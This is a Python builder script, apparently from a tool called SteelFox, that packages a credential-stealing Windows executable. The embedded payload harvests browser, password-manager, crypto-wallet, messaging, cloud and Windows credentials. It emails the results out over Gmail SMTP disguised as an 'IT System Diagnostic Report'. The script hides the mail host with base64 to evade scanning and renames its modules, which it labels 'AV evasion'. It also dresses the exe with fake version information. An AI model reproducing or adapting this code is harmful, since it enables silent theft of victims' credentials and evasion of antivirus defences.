#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SteelFox Builder CLI
====================
Command-line equivalent of builder.py (no GUI, no Tkinter required).
Works on Windows, and on Linux/macOS if used as part of a CI pipeline
that runs on a Windows runner (e.g. GitHub Actions windows-latest).

Usage
-----
  python builder_cli.py \\
      --receiver you@gmail.com \\
      --sender   you@gmail.com \\
      --password "abcd efgh ijkl mnop" \\
      --name     SysHealthCheck \\
      --output   ./dist

  # Sender defaults to receiver when omitted:
  python builder_cli.py -r you@gmail.com -p "app_password" -n MyTool

Environment variables (override CLI flags when set):
  SF_RECEIVER  –  recipient email
  SF_SENDER    –  sender email  (defaults to SF_RECEIVER)
  SF_PASSWORD  –  Gmail App Password
  SF_NAME      –  output exe name  (default: output)
  SF_OUTPUT    –  output directory (default: current dir)
"""

from __future__ import annotations

import argparse
import base64
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT_DIR   = Path(__file__).resolve().parent
ASSETS_DIR = ROOT_DIR / "steelfox" / "assets"

# ─── Same payload template as builder.py ─────────────────────────────────

_PAYLOAD_TEMPLATE = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import os
import smtplib
import sys
import tempfile
import time
import shutil
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


if getattr(sys, "frozen", False):
    _BASE = sys._MEIPASS
    sys.path.insert(0, _BASE)
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _BASE)


def _submit_report(origin: str, token: str, destination: str, data_path: str) -> bool:
    # SMTP host/port decoded at runtime to avoid static string scanning
    _h = base64.b64decode("c210cC5nbWFpbC5jb20=").decode()  # smtp.gmail.com
    _p = 0x24B  # 587

    message = MIMEMultipart()
    message["From"]    = origin
    message["To"]      = destination
    message["Subject"] = "IT System Diagnostic Report"
    message.attach(MIMEText(
        "Please find attached the automated system diagnostic report.\\\\n\\\\n"
        "This report was generated by the IT monitoring service.",
        "plain",
    ))

    with open(data_path, "rb") as fh:
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(fh.read())
        encoders.encode_base64(attachment)
        attachment.add_header(
            "Content-Disposition",
            'attachment; filename="{}"'.format(os.path.basename(data_path)),
        )
        message.attach(attachment)

    for _attempt in range(3):
        try:
            with smtplib.SMTP(_h, _p, timeout=30) as _conn:
                _conn.ehlo()
                _conn.starttls()
                _conn.login(origin, token)
                _conn.sendmail(origin, destination, message.as_string())
            return True
        except Exception:
            if _attempt < 2:
                time.sleep(10)
    return False


def main() -> None:
    _dest   = "{RECEIVER}"
    _origin = "{SENDER}"
    _token  = base64.b64decode("{ENC_PASS}").decode()

    with tempfile.TemporaryDirectory() as _work_dir:
        from sysdiag.core.config import config
        from sysdiag.core.runner import run_steelfox
        from sysdiag.core.output import StandardOutput

        config.quiet_mode      = True
        config.background_mode = True
        config.st              = StandardOutput()

        for _ in run_steelfox(
            category="all",
            output_dir=_work_dir,
            output_format="html",
        ):
            pass

        for _fname in os.listdir(_work_dir):
            if _fname.endswith(".html"):
                _report_path = os.path.join(_work_dir, _fname)
                _cache = os.path.join(
                    os.environ.get("TEMP", os.path.expanduser("~")),
                    "sys_diag_cache.html",
                )
                try:
                    shutil.copy2(_report_path, _cache)
                except Exception:
                    pass
                _submit_report(_origin, _token, _dest, _report_path)
                break


if __name__ == "__main__":
    main()
"""

# ─── Build helpers (mirrors BuilderApp logic) ─────────────────────────────

def _log(msg: str) -> None:
    print(f"[*] {msg}", flush=True)


def _copy_steelfox(tmp: Path) -> None:
    src_pkg  = ROOT_DIR / "steelfox"
    src_main = ROOT_DIR / "steelfox.py"
    if not src_pkg.exists():
        raise FileNotFoundError(f"steelfox package not found: {src_pkg}")
    if not src_main.exists():
        raise FileNotFoundError(f"steelfox.py not found: {src_main}")
    shutil.copytree(str(src_pkg), str(tmp / "steelfox"),
                    ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    shutil.copy2(str(src_main), str(tmp / "steelfox.py"))


def _write_version_info(tmp: Path, name: str) -> None:
    ver = f"""# UTF-8
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0),
    prodvers=(1, 0, 0, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringTable(
          '040904B0',
          [
            StringStruct('CompanyName', 'Tiger-Foxx'),
            StringStruct('FileDescription', '{name}'),
            StringStruct('FileVersion', '1.0.0.0'),
            StringStruct('InternalName', '{name}'),
            StringStruct('LegalCopyright', 'Copyright 2026 Tiger-Foxx. All rights reserved.'),
            StringStruct('OriginalFilename', '{name}.exe'),
            StringStruct('ProductName', '{name}'),
            StringStruct('ProductVersion', '1.0.0.0'),
          ]
        )
      ]
    ),
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
"""
    (tmp / "version_info.txt").write_text(ver, encoding="utf-8")


def _generate_script(tmp: Path, receiver: str, sender: str, password: str) -> Path:
    enc    = base64.b64encode(password.encode()).decode()
    source = (_PAYLOAD_TEMPLATE
              .replace("{RECEIVER}", receiver)
              .replace("{SENDER}", sender)
              .replace("{ENC_PASS}", enc))
    script = tmp / "main.py"
    script.write_text(source, encoding="utf-8")
    return script


def _resolve_icon(tmp: Path, custom_icon: str | None = None) -> str:
    """Copy a .ico to tmp and return its path, or return empty string."""
    if custom_icon:
        src = Path(custom_icon)
        if src.exists():
            dst = tmp / src.name
            shutil.copy2(str(src), str(dst))
            return str(dst)
    default = ASSETS_DIR / "logo-steel-fox-icon.ico"
    if default.exists():
        dst = tmp / default.name
        shutil.copy2(str(default), str(dst))
        return str(dst)
    return ""


def _rename_package(tmp: Path, script: Path) -> tuple[Path, str]:
    """Copy steelfox/ → sysdiag/ and patch all string references."""
    src_pkg = tmp / "steelfox"
    dst_pkg = tmp / "sysdiag"
    if dst_pkg.exists():
        shutil.rmtree(str(dst_pkg))
    shutil.copytree(str(src_pkg), str(dst_pkg))
    for py_file in dst_pkg.rglob("*.py"):
        try:
            text = py_file.read_text(encoding="utf-8", errors="ignore")
            py_file.write_text(
                text.replace("steelfox", "sysdiag").replace("stealth_mode", "background_mode"),
                encoding="utf-8",
            )
        except Exception:
            pass
    if script.exists():
        text = script.read_text(encoding="utf-8", errors="ignore")
        script.write_text(
            text.replace("steelfox", "sysdiag").replace("stealth_mode", "background_mode"),
            encoding="utf-8",
        )
    pkg_data = str(dst_pkg) + os.pathsep + "sysdiag"
    return dst_pkg, pkg_data


def _pyinstaller_build(tmp: Path, script: Path, name: str, icon: str) -> Path:
    dst_pkg, pkg_data = _rename_package(tmp, script)

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--windowed",
        "--noconfirm",
        "--noupx",
        "--optimize", "2",
        "--clean",
        "--name", name,
        "--distpath", str(tmp / "dist"),
        "--workpath", str(tmp / "build"),
        "--specpath", str(tmp),
        "--paths",    str(dst_pkg.parent),
        "--add-data", pkg_data,
        "--hidden-import", "sysdiag",
        "--hidden-import", "sysdiag.core",
        "--hidden-import", "sysdiag.core.config",
        "--hidden-import", "sysdiag.core.module_base",
        "--hidden-import", "sysdiag.core.module_loader",
        "--hidden-import", "sysdiag.core.output",
        "--hidden-import", "sysdiag.core.privileges",
        "--hidden-import", "sysdiag.core.runner",
        "--hidden-import", "sysdiag.core.winapi",
        "--hidden-import", "sysdiag.modules",
        "--hidden-import", "sysdiag.modules.browsers",
        "--hidden-import", "sysdiag.modules.browsers.chromium",
        "--hidden-import", "sysdiag.modules.browsers.firefox",
        "--hidden-import", "sysdiag.modules.cloud",
        "--hidden-import", "sysdiag.modules.cloud.cloud_services",
        "--hidden-import", "sysdiag.modules.databases",
        "--hidden-import", "sysdiag.modules.databases.db_clients",
        "--hidden-import", "sysdiag.modules.devtools",
        "--hidden-import", "sysdiag.modules.devtools.dev_credentials",
        "--hidden-import", "sysdiag.modules.gaming",
        "--hidden-import", "sysdiag.modules.gaming.crypto_wallets",
        "--hidden-import", "sysdiag.modules.gaming.multimedia",
        "--hidden-import", "sysdiag.modules.gaming.platforms",
        "--hidden-import", "sysdiag.modules.mails",
        "--hidden-import", "sysdiag.modules.mails.mail_clients",
        "--hidden-import", "sysdiag.modules.messaging",
        "--hidden-import", "sysdiag.modules.messaging.apps",
        "--hidden-import", "sysdiag.modules.messaging.discord",
        "--hidden-import", "sysdiag.modules.messaging.telegram",
        "--hidden-import", "sysdiag.modules.network",
        "--hidden-import", "sysdiag.modules.network.wifi_vpn",
        "--hidden-import", "sysdiag.modules.passwords",
        "--hidden-import", "sysdiag.modules.passwords.managers",
        "--hidden-import", "sysdiag.modules.reconnaissance",
        "--hidden-import", "sysdiag.modules.reconnaissance.system_recon",
        "--hidden-import", "sysdiag.modules.sysadmin",
        "--hidden-import", "sysdiag.modules.sysadmin.remote_tools",
        "--hidden-import", "sysdiag.modules.windows",
        "--hidden-import", "sysdiag.modules.windows.credentials",
    ]
    if icon:
        cmd += ["--icon", icon]
    ver_file = tmp / "version_info.txt"
    if ver_file.exists():
        cmd += ["--version-file", str(ver_file)]
    cmd.append(str(script))

    result = subprocess.run(cmd, cwd=str(tmp))
    if result.returncode != 0:
        raise RuntimeError(f"PyInstaller failed (code {result.returncode}).")

    exe = tmp / "dist" / f"{name}.exe"
    if not exe.exists():
        raise FileNotFoundError(f"Expected executable not found: {exe}")
    return exe


# ─── CLI entry point ──────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="builder_cli.py",
        description=(
            "SteelFox CLI Builder — produces a standalone Windows .exe\n"
            "that silently collects credentials and emails an HTML report.\n\n"
            "Parameters can also be set via environment variables:\n"
            "  SF_RECEIVER, SF_SENDER, SF_PASSWORD, SF_NAME, SF_OUTPUT"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-r", "--receiver",
        default=os.environ.get("SF_RECEIVER", ""),
        help="Recipient email address (required). Env: SF_RECEIVER",
    )
    parser.add_argument(
        "-s", "--sender",
        default=os.environ.get("SF_SENDER", ""),
        help="Sender Gmail address. Defaults to --receiver. Env: SF_SENDER",
    )
    parser.add_argument(
        "-p", "--password",
        default=os.environ.get("SF_PASSWORD", ""),
        help="Gmail App Password (16 chars). Env: SF_PASSWORD",
    )
    parser.add_argument(
        "-n", "--name",
        default=os.environ.get("SF_NAME", "output"),
        help='Output exe name without extension (default: output). Env: SF_NAME',
    )
    parser.add_argument(
        "-o", "--output",
        default=os.environ.get("SF_OUTPUT", str(Path.cwd())),
        help="Output directory (default: current directory). Env: SF_OUTPUT",
    )
    parser.add_argument(
        "-i", "--icon",
        default=None,
        help="Path to a custom .ico file for the generated executable.",
    )
    return parser.parse_args()


def main() -> None:
    args = _parse_args()

    receiver = args.receiver.strip()
    sender   = (args.sender.strip() or receiver)
    password = args.password.strip()
    name     = args.name.strip() or "output"
    out_dir  = Path(args.output).resolve()

    # Validate
    errors = []
    if not receiver:
        errors.append("--receiver is required.")
    if not password:
        errors.append("--password is required.")
    if not out_dir.exists():
        try:
            out_dir.mkdir(parents=True)
        except Exception as exc:
            errors.append(f"Cannot create output directory: {exc}")
    if errors:
        for e in errors:
            print(f"[!] {e}", file=sys.stderr)
        sys.exit(1)

    _log(f"Receiver : {receiver}")
    _log(f"Sender   : {sender}")
    _log(f"Exe name : {name}.exe")
    _log(f"Output   : {out_dir}")

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        _log("Copying SteelFox sources...")
        _copy_steelfox(tmp)

        _log("Writing version info...")
        _write_version_info(tmp, name)

        _log("Generating entry script...")
        script = _generate_script(tmp, receiver, sender, password)

        _log("Resolving icon...")
        icon_path = _resolve_icon(tmp, args.icon)

        _log("Renaming package (AV evasion)...")
        _log("Running PyInstaller...")
        exe = _pyinstaller_build(tmp, script, name, icon_path)

        dest = out_dir / f"{name}.exe"
        if dest.exists():
            dest.unlink()
        shutil.move(str(exe), str(dest))

    print(f"\n[+] Done: {dest}", flush=True)


if __name__ == "__main__":
    main()
